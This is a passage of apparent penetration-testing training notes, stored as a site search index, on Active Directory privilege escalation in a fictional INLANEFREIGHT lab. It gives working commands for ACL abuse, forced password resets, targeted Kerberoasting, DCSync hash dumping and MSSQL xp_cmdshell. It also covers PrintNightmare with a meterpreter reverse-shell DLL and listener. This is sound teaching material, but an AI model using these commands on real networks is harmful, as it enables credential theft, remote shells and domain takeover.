$UserSearcher.FindAll() }\n+                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\n    + FullyQualifiedErrorId : DirectoryServicesCOMException\n</code></pre> <p>However this does not happen with DRP connections, whereas our TGT is sent during the authentication process to obtain a service ticket for the RDP session. It is then cached on the remote host for subsequent use. This allows seamless access to domain resources from the remote host.</p>","tags":["active directory","ldap","windows"]},{"location":"active-directory-from-windows-privilege-escalation/#workaround-1-unconstrained-delegation","title":"Workaround #1: unconstrained delegation","text":"<p>If unconstrained delegation is enabled on a server, it is likely we won't face the \"Double Hop\" problem. In this scenario, when a user sends their TGS ticket to access the target server, their TGT ticket will be sent along with the request. The target server now has the user's TGT ticket in memory and can use it to request a TGS ticket on their behalf on the next host they are attempting to access.</p>","tags":["active directory","ldap","windows"]},{"location":"active-directory-from-windows-privilege-escalation/#workaround-2-evil-winrm-and-pscredential-object","title":"Workaround #2:  Evil-WinRM and PSCredential Object","text":"<p>We can use a \"nested\" Invoke-Command to send credentials (after creating a PSCredential object) with every request.</p> <pre><code># Set up: we are connected to the host machine from our attacker machine via Evil-WinRM\n# 1. We create a SecureString Object with our creds\n$SecPassword = ConvertTo-SecureString '$password' -AsPlainText -Force\n# Example: \n# $SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force\n\n$Cred = New-Object System.Management.Automation.PSCredential('$domain\\$userSamAccountName', $SecPassword)\n# Example:\n# $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\\backupadm', $SecPassword)\n\n# 2. Import PowerView module and embed creds in all commands. In the example we are requesting the Service Principals. If we try without specifying the\u00a0`-credential`\u00a0flag, we get an error message.\nimport-module .\\PowerView.ps1\nget-domainuser -spn -credential $Cred | select samaccountname\n</code></pre>","tags":["active directory","ldap","windows"]},{"location":"active-directory-from-windows-privilege-escalation/#workaround-3-win-rm-and-register-pssession-configuration","title":"Workaround #3: Win-RM and Register PSSession Configuration","text":"<p>Note: We cannot use\u00a0<code>Register-PSSessionConfiguration</code>\u00a0from an evil-winrm shell because we won't be able to get the credentials popup. Furthermore, if we try to run this by first setting up a PSCredential object and then attempting to run the command by passing credentials like\u00a0<code>-RunAsCredential $Cred</code>, we will get an error because we can only use\u00a0<code>RunAs</code>\u00a0from an elevated PowerShell terminal. Therefore, this method will not work via an evil-winrm session as it requires GUI access and a proper PowerShell console. Furthermore, in our testing, we could not get this method to work from PowerShell on a Parrot or Ubuntu attack host due to certain limitations on how PowerShell on Linux works with Kerberos credentials.</p> <pre><code># Establish a WinRM session on the remote host.\nEnter-PSSession -ComputerName $hostName.$domain -Credential $domain\\$user\n# Example\n# Enter-PSSession -ComputerName ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL -Credential inlanefreight\\backupadm\n</code></pre> <p>Due to the double hop problem, we can only interact with resources in our current session but cannot access the DC directly using PowerView. One trick we can use here is registering a new session configuration using the\u00a0Register-PSSessionConfiguration\u00a0cmdlet.</p> <pre><code># REgister a new session\nRegister-PSSessionConfiguration -Name $SessionName -RunAsCredential $domain\\$userSamAccountName\n# Example:\n# Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\\backupadm\n\n# Once this is done, we need to restart the WinRM service. From the PS session:\nRestart-Service WinRM\n# This will kick us out, so we'll start a new PSSession using the named registered session we set up previously.\n\n# After we start the session, we can see that the double hop problem has been eliminated.\nEnter-PSSession -ComputerName $hostName -Credential $domain\\$userSamAccountName -ConfigurationName  $sessionName\n# Example:\n# Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\\backupadm -ConfigurationName  backupadmsess\n\n# We can now run tools such as PowerView without having to create a new PSCredential object. For example:\nget-domainuser -spn | select samaccountname\n</code></pre>","tags":["active directory","ldap","windows"]},{"location":"active-directory-from-windows-privilege-escalation/#access-control-list-aclabuse","title":"\ud83d\udec2  Access Control List (ACL)Abuse","text":"<p>See more about Access Control List.</p> <p>During an assessment where the client has taken care of all of the \"low hanging fruit\" AD flaws/misconfigurations, ACL abuse can be a great way for us to move laterally/vertically and even achieve full domain compromise. </p> <p>Some example Active Directory object security permissions are as follows.</p> <ul> <li><code>ForceChangePassword</code>\u00a0abused with\u00a0<code>Set-DomainUserPassword</code></li> <li><code>Add Members</code>\u00a0abused with\u00a0<code>Add-DomainGroupMember</code></li> <li><code>GenericAll</code>\u00a0abused with\u00a0<code>Set-DomainUserPassword</code>\u00a0or\u00a0<code>Add-DomainGroupMember</code></li> <li><code>GenericWrite</code>\u00a0abused with\u00a0<code>Set-DomainObject</code></li> <li><code>WriteOwner</code>\u00a0abused with\u00a0<code>Set-DomainObjectOwner</code></li> <li><code>WriteDACL</code>\u00a0abused with\u00a0<code>Add-DomainObjectACL</code></li> <li><code>AllExtendedRights</code>\u00a0abused with\u00a0<code>Set-DomainUserPassword</code>\u00a0or\u00a0<code>Add-DomainGroupMember</code></li> <li><code>Addself</code>\u00a0abused with\u00a0<code>Add-DomainGroupMember</code></li> </ul> <p>We can use ACL attacks for:</p> <ul> <li>Lateral movement</li> <li>Privilege escalation</li> <li>Persistence</li> </ul>","tags":["active directory","ldap","windows"]},{"location":"active-directory-from-windows-privilege-escalation/#enumerating-acls","title":"Enumerating ACLs","text":"","tags":["active directory","ldap","windows"]},{"location":"active-directory-from-windows-privilege-escalation/#powerview_1","title":"PowerView","text":"<pre><code># First import PowerView module\nImport-Module .\\PowerView.ps1\n\n# Now enumerate\nFind-InterestingDomainAcl\n</code></pre> <p>Now, there is a way to use a tool such as PowerView more effectively -- by performing targeted enumeration starting with a user that we have control over. </p> <pre><code># First import PowerView module\nImport-Module .\\PowerView.ps1\n\n# Obtain the SID of the user you have control on, for instance wley, and set it to variable $sid\n$sid = Convert-NameToSid wley\n\n#  Find all domain objects that our user has rights over \nGet-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}\n# -ResolveGUIDs: PowerView flag that will return the ObjectAceType property in a readable way and not as a GUID value that is not human readable.\n\n# Lists of objects which you have Force-Change-Password right over. First, get your current user\u2019s sid by executing\u00a0`whoami /user`, import powerview, then execute the below command to get the list of objects on which you have\u00a0_Force-Change-Password_.\nget-objectacl -resolveguids | ? {($_.securityidentifier -eq \"[your_current_user_sid]\") -and ($_.objectacetype -eq \"User-Force-Change-Password\")}\n\n# Examine the rights that a user has over a group\n$sid = Convert-NameToSid $userSamAccountName\nGet-DomainObjectACL -Identity \"$groupName\" -ResolveGUIDs | ? {$_.SecurityIdentifier -eq $sid}\n\n# Examine the rights that a user has over another user\n$sid = Convert-NameToSid $user1SamAccountName\nGet-DomainObjectACL -Identity \"$user2SamAccountName\" -ResolveGUIDs | ? {$_.SecurityIdentifier -eq $sid}\n</code></pre> <p>Result:</p> <pre><code>AceQualifier           : AccessAllowed\nObjectDN               : CN=Dana Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\nActiveDirectoryRights  : ExtendedRight\nObjectAceType          : User-Force-Change-Password\nObjectSID              : S-1-5-21-3842939050-3880317879-2865463114-1176\nInheritanceFlags       : ContainerInherit\nBinaryLength           : 56\nAceType                : AccessAllowedObject\nObjectAceFlags         : ObjectAceTypePresent\nIsCallback             : False\nPropagationFlags       : None\nSecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1181\nAccessMask             : 256\nAuditFlags             : None\nIsInherited            : False\nAceFlags               : ContainerInherit\nInheritedObjectAceType : All\nOpaqueLength           : 0\n</code></pre> <p>The ObjectAceType <code>User-Force-Change-Password</code> means that we have the right to modify <code>Dana Amundsen</code>'s password.</p> <p>Without the PowerView flag <code>-ResolveGUIDs</code>, we would get <code>ObjectAceType          : 00299570-246d-11d0-a768-00aa006e0529</code>, the GUID. We can google and get to this microsoft page.  We can also perform a Reverse Search &amp; Map to a GUID Value:</p> <pre><code>$guid= \"00299570-246d-11d0-a768-00aa006e0529\"\n\nGet-ADObject -SearchBase \"CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)\" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl\n</code></pre>","tags":["active directory","ldap","windows"]},{"location":"active-directory-from-windows-privilege-escalation/#powershell","title":"Powershell","text":"<pre><code># Create a List of Domain Users\nGet-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName &gt; ad_users.txt\n\n# For each user, use the Get-Acl cmdlet to retrieve ACL information of every user with the Get-ADUser cmdlet\nforeach($line in [System.IO.File]::ReadLines(\"C:\\Users\\htb-student\\Desktop\\ad_users.txt\")) {get-acl  \"AD:\\$(Get-ADUser $line)\" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\\\wley'}}\n\n# Once we have this data, we could follow the same methods shown above to convert the GUID to a human-readable format to understand what rights we have over the target user.\n$guid= \"00299570-246d-11d0-a768-00aa006e0529\"\n\nGet-ADObject -SearchBase \"CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)\" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl\n</code></pre>","tags":["active directory","ldap","windows"]},{"location":"active-directory-from-windows-privilege-escalation/#bloodhound","title":"Bloodhound","text":"<p>See bloodhound.</p> <p>Steps: </p> <ol> <li>Launch bloodhound. Update the zip/json files. </li> <li>Set a user \u00a0as the starting node, select the\u00a0<code>Node Info</code>\u00a0tab and scroll down to\u00a0<code>Outbound Control Rights</code>.  </li> <li>This option will show us objects we have control over directly, via group membership, and the number of objects that our user could lead to us controlling via ACL attack paths under\u00a0<code>Transitive Object Control</code>.</li> </ol> <p>By right-clicking on the line between  two objects, a menu will pop up.</p>","tags":["active directory","ldap","windows"]},{"location":"active-directory-from-windows-privilege-escalation/#forcechangepassword","title":"ForceChangePassword","text":"<p>This abuse can be carried out when controlling an object that has a GenericAll, AllExtendedRights or User-Force-Change-Password over the target user.</p>","tags":["active directory","ldap","windows"]},{"location":"active-directory-from-windows-privilege-escalation/#change-password-plaintext","title":"Change password (plaintext)","text":"<p>The attacker can change the password of the user. This can be achieved with\u00a0Set-DomainUserPassword\u00a0(PowerView\u00a0module).</p> <pre><code>$NewPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force \n\nSet-DomainUserPassword -Identity $TargetUser -AccountPassword $NewPassword\n\nrunas /$TargetUser:[domain\\$TargetUser] cmd.exe\n</code></pre> <p>We can also use mimikatz:</p> <pre><code>.\\mimikatz.exe\nprivilege::debug\nlsadump::setntlm\n</code></pre>","tags":["active directory","ldap","windows"]},{"location":"active-directory-from-windows-privilege-escalation/#change-password-using-securestring-object","title":"Change password using SecureString Object","text":"<pre><code># Wley will change the password of damundsen. First, open Powershell as Wley\n# Creating a PSCredential Object\n$SecPassword = ConvertTo-SecureString '$wleyPassword' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\\wley', $SecPassword) \n\n# Creating a SecureString Object\n$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force\n\n# Changing the User's Password\ncd C:\\Tools\\\nImport-Module .\\PowerView.ps1\nSet-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose\n</code></pre> <p>Note: The <code>SecureString</code> object (<code>$SecPassword</code>) is associated with the user <code>wley</code> because it is used to create a <code>PSCredential</code> object, which represents a specific user's credentials. These credentials are used afterwards with the  <code>Set-DomainUserPassword</code> command, whereas the <code>-Credential</code> parameter ensures that all actions taken within that cmdlet use the privileges of the <code>wley</code> account.</p>","tags":["active directory","ldap","windows"]},{"location":"active-directory-from-windows-privilege-escalation/#addmember","title":"AddMember","text":"<p>This abuse can be carried out when controlling an object that has a\u00a0<code>GenericAll</code>,\u00a0<code>GenericWrite</code>,\u00a0<code>Self</code>,\u00a0<code>AllExtendedRights</code>\u00a0or\u00a0<code>Self-Membership</code>, over the target group.</p> <p>Let's imagine we have gained access to the user damundsen via the ForceChangePassword abuse. Now we can continue using PowerView to take this attack further:</p> <pre><code>$sid2 = Convert-NameToSid damundsen\n\nGet-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose\n</code></pre> <p>See the results:</p> <pre><code>AceType               : AccessAllowed\nObjectDN              : CN=Help Desk Level 1,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\nActiveDirectoryRights : ListChildren, ReadProperty, GenericWrite\nOpaqueLength          : 0\nObjectSID             : S-1-5-21-3842939050-3880317879-2865463114-4022\nInheritanceFlags      : ContainerInherit\nBinaryLength          : 36\nIsInherited           : False\nIsCallback            : False\nPropagationFlags      : None\nSecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1176\nAccessMask            : 131132\nAuditFlags            : None\nAceFlags              : ContainerInherit\nAceQualifier          : AccessAllowed\n</code></pre>","tags":["active directory","ldap","windows"]},{"location":"active-directory-from-windows-privilege-escalation/#genericwrite","title":"GenericWrite","text":"<p>Our user damundsen has GenericWrite privileges over the <code>Help Desk Level 1</code> group. This means, among other things, that the attacker can add a user/group/computer to a group.</p> LinuxWindowsWindows with SecureString <pre><code># With net and cleartext credentials (will be prompted) \nnet rpc group addmem \"$TargetGroup\" \"$TargetUser\" -U \"$DOMAIN\"/\"$USER\" -S \"$DC_HOST\" \n\n# With net and cleartext credentials \nnet rpc group addmem \"$TargetGroup\" \"$TargetUser\" -U \"$DOMAIN\"/\"$USER\"%\"$PASSWORD\" -S \"$DC_HOST\" \n\n# With Pass-the-Hash \npth-net rpc group addmem \"$TargetGroup\" \"$TargetUser\" -U \"$DOMAIN\"/\"$USER\"%\"ffffffffffffffffffffffffffffffff\":\"$NT_HASH\" -S \"$DC_HOST\"\n</code></pre> <pre><code># Command line\nnet group 'Help Desk Level 1' $user /add /domain \n\n# Powershell: Active Directory module \nAdd-ADGroupMember -Identity 'Help Desk Level 1' -Members $user\n\n# Powershell: PowerSploit module \nAdd-DomainGroupMember -Identity 'Help Desk Level 1' -Members $user\n</code></pre> <p>```powershell</p>","tags":["active directory","ldap","windows"]},{"location":"active-directory-from-windows-privilege-escalation/#creating-a-securestring-object-using-damundsen","title":"Creating a SecureString Object using damundsen","text":"<p>$SecPassword = ConvertTo-SecureString '$damundsenPassword' -AsPlainText -Force $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\\damundsen', $SecPassword) </p>","tags":["active directory","ldap","windows"]},{"location":"active-directory-from-windows-privilege-escalation/#add-damundsen-to-the-group","title":"Add damundsen to the group","text":"<p>Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose</p>","tags":["active directory","ldap","windows"]},{"location":"active-directory-from-windows-privilege-escalation/#confirming-damundsen-was-added-to-the-group","title":"Confirming damundsen was Added to the Group","text":"<p>Get-DomainGroupMember -Identity \"Help Desk Level 1\" | Select MemberName</p>","tags":["active directory","ldap","windows"]},{"location":"active-directory-from-windows-privilege-escalation/#genericall","title":"GenericAll","text":"<p>Investigating the Help Desk Level 1 Group with Get-DomainGroup: </p> <pre><code>Get-DomainGroup -Identity \"Help Desk Level 1\" | select memberof\n\n# memberof                                                      #                 \n# --------                                                      \n# CN=Information Technology,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\n</code></pre> <p>The Help Desk Level 1 group is nested into the Information Technology group.  </p> <p>Investigating the Information Technology Group</p> <pre><code>$itgroupsid = Convert-NameToSid \"Information Technology\"\n\nGet-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid} -Verbose\n</code></pre> <p>Results: <pre><code>AceType               : AccessAllowed\nObjectDN              : CN=Angela Dunn,OU=Server Admin,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\nActiveDirectoryRights : GenericAll\nOpaqueLength          : 0\nObjectSID             : S-1-5-21-3842939050-3880317879-2865463114-1164\nInheritanceFlags      : ContainerInherit\nBinaryLength          : 36\nIsInherited           : False\nIsCallback            : False\nPropagationFlags      : None\nSecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-4016\nAccessMask            : 983551\nAuditFlags            : None\nAceFlags              : ContainerInherit\nAceQualifier          : AccessAllowed\n</code></pre></p> <p>Members of the\u00a0<code>Information Technology</code>\u00a0group have\u00a0<code>GenericAll</code>\u00a0rights over the user\u00a0<code>adunn</code>, which means we could:</p> <ul> <li>Modify group membership</li> <li>Force change a password</li> <li>Perform a targeted Kerberoasting attack and attempt to crack the user's password if it is weak</li> </ul> <p>Let's do a kerberoasting attack:</p> <pre><code># Creating a SecureString Object using damundsen\n$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force\n$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\\damundsen', $SecPassword) \n\n# Creating a Fake SPN\nSet-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose\n\n#  Kerberoasting with Rubeus\n.\\Rubeus.exe kerberoast /user:adunn /nowrap\n\n# Crack it\nhashcat -m 13100 $filename /usr/share/wordlists/rockyou.txt\n</code></pre> <p>Clean up:</p> <pre><code># 1. Removing the Fake SPN from adunn's Account\nSet-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose\n\n# 2. Remove the damundsen user from the Help Desk Level 1 group\nRemove-DomainGroupMember -Identity \"Help Desk Level 1\" -Members 'damundsen' -Credential $Cred2 -Verbose\n# Confirming damundsen was Removed from the Group\nGet-DomainGroupMember -Identity \"Help Desk Level 1\" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose\n</code></pre>","tags":["active directory","ldap","windows"]},{"location":"active-directory-from-windows-privilege-escalation/#dcsync","title":"DCSync","text":"<p>DCSync is a technique for stealing the Active Directory password database by using the built-in Directory Replication Service Remote Protocol, which is used by Domain Controllers to replicate domain data. This allows an attacker to mimic a Domain Controller to retrieve user NTLM password hashes.</p> <p>The crux of the attack is requesting a Domain Controller to replicate passwords via the DS-Replication-Get-Changes-All extended right. This is an extended access control right within AD, which allows for the replication of secret data.</p> <p>To perform this attack, you must have control over an account that has the rights to perform domain replication (a user with the Replicating Directory Changes and Replicating Directory Changes All permissions set). Domain/Enterprise Admins and default domain administrators have this right by default.</p> <p>1. Use Get-DomainUser to View the users's Group Membership:</p> <pre><code>Get-DomainUser -Identity $userSamAccountName  |select samaccountname,objectsid,memberof,useraccountcontrol |fl\n</code></pre> <p>2. Check if the user has replication rights:</p> <pre><code># we obtained the sid from previous command\n$sid= \"S-1-5-21-3842939050-3880317879-2865463114-1164\"\n\nGet-ObjectAcl \"DC=inlanefreight,DC=local\" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl\n</code></pre> <p>DCSync replication can be performed using tools such as Mimikatz, Invoke-DCSync, and Impacket\u2019s secretsdump.py.</p>","tags":["active directory","ldap","windows"]},{"location":"active-directory-from-windows-privilege-escalation/#linux-impackets-secretsdumppy","title":"Linux:  Impacket\u2019s secretsdump.py","text":"<pre><code>secretsdump.py -outputfile $filename -just-dc $domain/$userSamAccountName@$ipDomainController\n# As an example:\n# secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 \n# -just-dc flag tells the tool to extract NTLM hashes and Kerberos keys from the NTDS file.\n# -just-dc flag tells the tool to extract NTLM hashes and Kerberos keys from the NTDS file.\n# just-dc-user &lt;USERNAME&gt; to only extract data for a specific user\n# -pwd-last-set to see when each account's password was last changed\n# -history if we want to dump password history\n# -user-status flag to check and see if a user is disabled. \n\n# This will generate 3 files with dumped secrets\n</code></pre>","tags":["active directory","ldap","windows"]},{"location":"active-directory-from-windows-privilege-escalation/#reversible-encryption-password-storage-set","title":"Reversible Encryption Password Storage Set","text":"<p>When this option is set on a user account, the passwords are stored using RC4 encryption, the key needed to decrypt them is stored in the registry (the\u00a0Syskey) and can be extracted by a Domain Admin or equivalent.</p> <p>Enumerate accounts with reversible Encryption Password Storage Set with Active Directive cmdlet:</p> <pre><code>Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl\n</code></pre> <p>Enumerate accounts with reversible Encryption Password Storage Set with PowerView:</p> <pre><code>Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol\n</code></pre> <p>To decrypt it we can use Impacket\u2019s secretsdump.py:</p> <pre><code>secretsdump.py -outputfile $filename -just-dc $domain/$userSamAccountName@$ipDomainController\n# As an example:\n# secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 \n</code></pre>","tags":["active directory","ldap","windows"]},{"location":"active-directory-from-windows-privilege-escalation/#mimikatz","title":"Mimikatz","text":"<p>Mimikatz must be ran in the context of the user who has DCSync privileges. We can utilize\u00a0<code>runas.exe</code>\u00a0to accomplish this:</p> <pre><code>runas /netonly /user:$domain\\$userSamAccountName powershell\n# Example:\n# runas /netonly /user:INLANEFREIGHT\\adunn powershell\n</code></pre> <p>And now, from powershell:</p> <pre><code>.\\mimikatz.exe\n\n#########\n# mimikatz command\n########\n\nlsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\\administrator\n</code></pre>","tags":["active directory","ldap","windows"]},{"location":"active-directory-from-windows-privilege-escalation/#privileged-access","title":"\u26d4 Privileged Access","text":"<p>Sometimes we don't \u00a0have local admin rights on any hosts in the domain. However there are other ways to access the host:</p> <ul> <li> <p><code>Remote Desktop Protocol</code>\u00a0(<code>RDP</code>) - is a remote access/management protocol that gives us GUI access to a target host</p> </li> <li> <p>PowerShell Remoting\u00a0- also referred to as PSRemoting or Windows Remote Management (WinRM) access, is a remote access protocol that allows us to run commands or enter an interactive command-line session on a remote host using PowerShell</p> </li> <li> <p><code>MSSQL Server</code>\u00a0- an account with sysadmin privileges on an SQL Server instance can log into the instance remotely and execute queries against the database. </p> </li> </ul> <p>Via BloodHound we can enumerate the following edges to see what types of remote access privileges a given user has:</p> <ul> <li>CanRDP</li> <li>CanPSRemote</li> <li>SQLAdmin</li> </ul>","tags":["active directory","ldap","windows"]},{"location":"active-directory-from-windows-privilege-escalation/#remote-desktop","title":"Remote Desktop","text":"<p>Enumerating the Remote Desktop Users Group with PowerView.ps1.</p> <pre><code>Import-Module .\\PowerView.ps1\n\n# Enumerate members accessing current machine\nGet-NetLocalGroupMember -GroupName \"Remote Desktop Users\"\n\n# Enumerate members accessing a given host\nGet-NetLocalGroupMember -ComputerName $HostName -GroupName \"Remote Desktop Users\"\n# Example:\n# Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName \"Remote Desktop Users\"\n</code></pre> <p>From Bloodhound, we can check the Analysis tab and run the pre-built queries <code>Find Workstations where Domain Users can RDP</code> or <code>Find Servers where Domain Users can RDP</code>.</p> <p>Test access with Linux: xfreerdp, rdesktop, Remmina  Windows:  mstsc.exe.</p>","tags":["active directory","ldap","windows"]},{"location":"active-directory-from-windows-privilege-escalation/#winrm","title":"WinRM","text":"<p>Enumerating the Remote Management Users Group with PowerView.ps1.</p> <pre><code>Import-Module .\\PowerView.ps1\n\n# Enumerate members accessing current machine\nGet-NetLocalGroupMember -GroupName \"Remote Management Users\"\n\n# Enumerate members accessing a given host\nGet-NetLocalGroupMember -ComputerName $HostName -GroupName \"Remote Management Users\"\n# Example:\n# Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName \"Remote Management Users\"\n</code></pre> <p>In Bloodhound, we can use this Cypher query and add it as a custom query:</p> <pre><code>MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]-&gt;(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]-&gt;(c:Computer) RETURN p2\n</code></pre> <p>To access from Linux, use evil-winrm.</p> <pre><code>evil-winrm -i $ip -u &lt;username -p &lt;password&gt;\n\nevil-winrm -i &lt;ip&gt; -u Administrator -H \"&lt;passwordhash&gt;\"\n# -H: Hash\n</code></pre> <p>To access from Windows, use Powershell and the Enter-PSSession\u00a0cmdlet:</p> <pre><code># Create a SecureString object_\n$password = ConvertTo-SecureString \"$passwordOfUser\" -AsPlainText -Force\n$cred = new-object System.Management.Automation.PSCredential (\"$domain\\$userSamAccountName\", $password)\n\n# Access the host\nEnter-PSSession -ComputerName $hostName -Credential $cred\n\n#####\n# Example:\n# $password = ConvertTo-SecureString \"Klmcargo2\" -AsPlainText -Force\n# $cred = new-object System.Management.Automation.PSCredential (\"INLANEFREIGHT\\forend\", $password)\n# Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred\n</code></pre>","tags":["active directory","ldap","windows"]},{"location":"active-directory-from-windows-privilege-escalation/#sql-server-admin","title":"SQL Server Admin","text":"<p>Enumerate via Bloodhound and the\u00a0<code>SQLAdmin</code>\u00a0edge. We can check for\u00a0<code>SQL Admin Rights</code>\u00a0in the\u00a0<code>Node Info</code>\u00a0tab for a given user or use this custom Cypher query to search:</p> <pre><code>MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]-&gt;(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]-&gt;(c:Computer) RETURN p2\n</code></pre> <p>Enumerating MSSQL Instances with PowerUpSQL. The command needs to be ran by an user with <code>SQLAdmin</code> rights: </p> <pre><code>cd C:\\Tools\\PowerUpSQL\\\nImport-Module .\\PowerUpSQL.ps1\nGet-SQLInstanceDomain\n</code></pre> <p>Authenticate against the remote SQL server host and run custom queries or operating system commands.</p> <p><pre><code>Get-SQLQuery -Verbose -Instance \"$ipHost,$port\" -username \"$domain\\$userSamAccountName\" -password \"$password\" -query 'Select @@version'\n\n# Example:\n# Get-SQLQuery -Verbose -Instance \"172.16.5.150,1433\" -username \"inlanefreight\\damundsen\" -password \"SQL1234!\" -query 'Select @@version'\n</code></pre> \u00a0 We can also authenticate from our Linux attack host using\u00a0mssqlclient.py\u00a0from the Impacket toolkit.</p> <pre><code>mssqlclient.py $domain/$user@$ip -windows-auth\n# Example:\n# mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth\n</code></pre> <p>We could then choose\u00a0<code>enable_xp_cmdshell</code>\u00a0to enable the\u00a0xp_cmdshell stored procedure\u00a0which allows for one to execute operating system commands via the database if the account in question has the proper access rights.</p> <pre><code>SQL&gt; enable_xp_cmdshell\n</code></pre> <p>Finally, we can run commands in the format\u00a0<code>xp_cmdshell &lt;command&gt;</code>.</p> <pre><code>xp_cmdshell whoami /priv\n</code></pre> <p>Finally, we can run commands in the format\u00a0<code>xp_cmdshell &lt;command&gt;</code>. Here we can enumerate the rights that our user has on the system and see that we have\u00a0SeImpersonatePrivilege, which can be leveraged in combination with a tool such as\u00a0JuicyPotato,\u00a0PrintSpoofer, or\u00a0RoguePotato\u00a0to escalate to\u00a0<code>SYSTEM</code>\u00a0level privileges, depending on the target host, and use this access to continue toward our goal.</p>","tags":["active directory","ldap","windows"]},{"location":"active-directory-from-windows-privilege-escalation/#printnightmare","title":"\ud83d\udda8\ufe0f PrintNightmare","text":"<p><code>PrintNightmare</code>\u00a0is the nickname given to two vulnerabilities (CVE-2021-34527\u00a0and\u00a0CVE-2021-1675) found in the\u00a0Print Spooler service\u00a0that runs on all Windows operating systems.</p> <p>We will be using\u00a0cube0x0's\u00a0exploit.</p> <pre><code>git clone https://github.com/cube0x0/CVE-2021-1675.git\n</code></pre> <p>For this exploit to work successfully, we will need to use cube0x0's version of Impacket:</p> <pre><code>pip3 uninstall impacket\ngit clone https://github.com/cube0x0/impacket\ncd impacket\npython3 ./setup.py install\n</code></pre> <p>Enumerating for MS-RPRN:</p> <pre><code># We can use rpcdump.py to see if Print System Asynchronous Protocol and Print System Remote Protocol are exposed on the target.\nrpcdump.py @$DomainControllerIP | egrep 'MS-RPRN|MS-PAR'\n# Example:\n# rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'\n</code></pre> <p>After confirming this, we can proceed with attempting to use the exploit. We can begin by crafting a DLL payload using msfvenom.</p> <pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$IPhost LPORT=8080 -f dll &gt; $FileName.dll\n# Example:\n# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll &gt; backupscript.dll\n</code></pre> <p>We will then host this payload in an SMB share we create on our attack host using smbserver.py.</p> <pre><code># Creating a Share with smbserver.py\nsudo smbserver.py -smb2support $ShareName /path/to/$FileName.dll\n# Example:\n# sudo smbserver.py -smb2support CompData /home/\n# This will leave out terminal in the host machine with no other use than that of sharing.\n</code></pre> <p>Then we will need to open a two new terminals in our attacker machine:</p> <pre><code># In the first terminal we will configure ant start a MSF multi/handler\nmsfconsole -q\nuse exploit/multi/handler\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST 172.16.5.225\nset LPORT 8080\nrun\n</code></pre> <pre><code># In the second terminal we will connect via ssh with the host machine:\nssh $user@$ip\n\n# Then we run the exploit:\nsudo python3 /opt/CVE-2021-1675/CVE-2021-1675.py $user/$user:$password@$domainControllerIP  '\\\\$ipHostMachine\\$ShareName\\$filename.dll'\n# Example:\n# sudo python3 /opt/CVE-2021-1675/CVE-2021-1675.py 